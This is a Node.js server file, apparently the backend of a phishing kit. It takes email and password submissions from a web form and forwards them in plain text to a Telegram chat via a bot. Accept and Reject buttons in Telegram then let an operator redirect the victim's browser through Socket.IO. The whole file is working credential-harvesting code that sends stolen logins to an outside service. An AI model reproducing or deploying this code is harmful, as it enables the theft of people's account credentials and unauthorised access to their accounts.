const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const bodyParser = require('body-parser'); // 📌 Agregado para manejar datos del formulario
require('dotenv').config(); // Asegúrate de tener tu archivo .env con el token

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Inicializa el bot
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

// Middleware
app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

io.on('connection', (socket) => {
  console.log('🟢 Cliente conectado vía Socket.IO');
  global.socket = socket;
});

// Ruta para recibir los datos del formulario
app.post('/enviar', (req, res) => {
  const { email, password } = req.body;

  const mensaje = `🆕 Nuevo intento de acceso:\n📧 Correo: ${email}\n🔑 Contraseña: ${password}`;
  bot.sendMessage(process.env.TELEGRAM_CHAT_ID, mensaje, {
    reply_markup: {
      inline_keyboard: [
        [{ text: '✅ Aceptar', callback_data: 'aceptar' }],
        [{ text: '❌ Rechazar', callback_data: 'rechazar' }]
      ]
    }
  });

  res.status(200).send("Datos enviados correctamente");
});

// Escucha botones del bot
bot.on('callback_query', (callbackQuery) => {
  const action = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;

  if (action === 'aceptar') {
    bot.sendMessage(chatId, '🟢 ¡Acceso aprobado!');
    if (global.socket) {
      global.socket.emit('redirect', '/bienvenido.html');
    }
  } else if (action === 'rechazar') {
    bot.sendMessage(chatId, '🔴 Acceso denegado.');
    if (global.socket) {
      global.socket.emit('redirect', '/denegado.html');
    }
  }
});

// Comando /start de prueba
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, 'Usa el formulario para probar el flujo.', {
    reply_markup: {
      inline_keyboard: [
        [{ text: '✅ Aceptar', callback_data: 'aceptar' }],
        [{ text: '❌ Rechazar', callback_data: 'rechazar' }]
      ]
    }
  });
});

// Inicia el servidor
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`);
});
